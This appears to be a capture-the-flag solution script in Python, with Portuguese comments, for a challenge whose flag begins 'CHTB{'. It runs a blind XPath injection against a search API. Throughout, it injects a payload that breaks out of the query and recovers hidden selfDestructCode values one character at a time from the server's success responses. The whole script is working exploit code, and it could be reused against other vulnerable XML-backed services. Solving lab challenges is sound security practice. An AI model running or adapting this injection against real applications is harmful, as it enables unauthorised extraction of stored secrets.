import requests

success_msg = "This millitary staff member exists."

# url = "http://138.68.182.20:31302/api/search" # URL original do desafio
url = "http://localhost:1337/api/search"

# Informações que sabemos previamente sobre a flag
prefix = "CHTB{"
start_2 =  "" 
flag = prefix
ini_pos = len(flag)
len_1 = 21
len_2 = 15

# Vamos enviar um JSON com a busca: {"search": "Algum Nome"}
headers = {
    'Content-Type': 'application/json',
}

# Monta a lista de caracteres da busca
charlist = ''
for chloop in range(256):
    if chloop < 32:
        continue
    
    if chr(chloop) == "'":
        continue

    charlist += chr(chloop)

# Testa cada caractere no servidor, via XPath Injection
# xpath = "']|(/military/district/staff/selfDestructCode)[1][substring(text(), <pos>, 1) = '<test_ch>"
def test_char(sdcIndex, pos, test_ch):
    # Mostra a flag atual
    print("Current Flag: {}".format(flag))

    # Monta a string injetada
    xpath = "']|(/military/district/staff/selfDestructCode)[{}][substring(text(), {}, 1) = '{}".format(sdcIndex, pos, test_ch)
    
    # Monta o JSON final que será enviado (payload)
    data = {
        "search": xpath
    }

    # Faz o POST para o servidor via requests
    response = requests.post(url, headers=headers, json=data, verify=False)

    # Verifica se recebeu uma resposta sem erro do servidor
    if response.status_code == 200:
        jresult = response.json()

        # Retorna verdadeiro se o Injection retornou algum resultado
        # aqui procuramos a chave "success" no JSON retornado
        # {"success": 1, "message": "This millitary staff member exists."}
        return "success" in jresult
    else:
        # Se houve algum erro, mostra o erro na tela
        print(response.status_code)
        print(response.text)
        return False

# Função que descobre cada letra de uma parte da flag (parâmetro item)
def check(item, start_pos, len_item):
    global flag

    # Loop pra cada posição da string da flag:
    # /military/district/staff[substring(selfDestructCode,<isso aqui varia>,1) = '<char>'
    ## Parte 1: 21 caracteres - sendo que os primeiros são 'CHTB{'
    #   - por isso o 'start_pos', pra não precisar da parte que já sabemos da flag
    ## Parte 2: 15 caracteres - mas só sabemos que termina com '}'
    for i in range(start_pos, len_item+1):
        found = False

        # Loop pra cada caractere na lista da busca
        # /military/district/staff[substring(selfDestructCode,<i>,1) = '<isso aqui varia>'
        for ch in charlist:

            # Testa se aquela posição da string (i) é igual a esse caractere (ch)
            if test_char(item, i+1, ch):

                # Se for, concatena o caractere na flag e sai desse loop para a próxima posição
                flag += ch
                found = True
                break
        
        if not(found):
            print("Search Finished for item {}!".format(item))
            break

# Checa a primeira e a segunda parte da flag
check(1, ini_pos, len_1)
check(2, len(start_2), len_2)

print('\n\n\nFinal Flag: ' + flag + '\n\n\n')
